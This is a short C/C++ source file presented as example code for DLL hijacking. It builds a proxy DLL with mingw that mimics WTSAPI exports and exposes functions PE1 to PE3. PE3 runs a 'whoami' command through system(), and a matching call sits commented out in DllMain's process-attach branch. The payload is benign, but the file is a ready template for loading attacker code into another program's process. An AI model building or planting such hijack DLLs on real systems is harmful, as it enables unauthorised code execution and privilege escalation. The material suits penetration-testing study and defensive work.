#include <windows.h>
#include <string>
#include <stdio.h>
// Example code for dll hijacking 
// x86_64-w64-mingw32-gcc dll.c -shared -o dll.dll


/*
typedef struct _WTS_PROCESS_INFOW {
  DWORD  SessionId;
  DWORD  ProcessId;
  LPWSTR pProcessName;
  PSID   pUserSid;
} WTS_PROCESS_INFOW, *PWTS_PROCESS_INFOW;

extern "C" __declspec(dllexport) BOOL __cdecl WTSEnumerateProcessesW (HANDLE hServer, DWORD Reserved, DWORD Version, PWTS_PROCESS_INFOW* ppProcessInfo, DWORD* pCount) {
    return false;
}

extern "C" __declspec(dllexport) BOOL __cdecl WTSQueryUserToken (ULONG SessionID, PHANDLE phToken) {
    return false;
}

extern "C" __declspec(dllexport) void __cdecl WTSFreeMemory(PVOID pMemory) {
}

extern "C" __declspec(dllexport) BOOL __cdecl WTSEnumerateSessionsW(){
    return false;
}
*/


char debugMsg [1024] = "";


extern "C" __declspec(dllexport) BOOL __cdecl PE1(){
    //system("whoami > C:\\sample\\pe1.txt");
    MessageBox (NULL, debugMsg, "1", MB_OK);
    return false;
}



extern "C" __declspec(dllexport) BOOL __cdecl PE2(){
    //system("whoami > C:\\sample\\pe2.txt");
    MessageBox (NULL, debugMsg, "2", MB_OK);
    return false;
}


// ordinal 3
extern "C" __declspec(dllexport) BOOL __cdecl PE3(){
    MessageBox (NULL, debugMsg, "3", MB_OK);
    system("whoami > C:\\sample\\pe3.txt");
    return false;
}





BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            //MessageBox (NULL, debugMsg, "Debug", MB_OK);
            // system("whoami > C:\\users\\public\\documents\\whoami.txt");
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
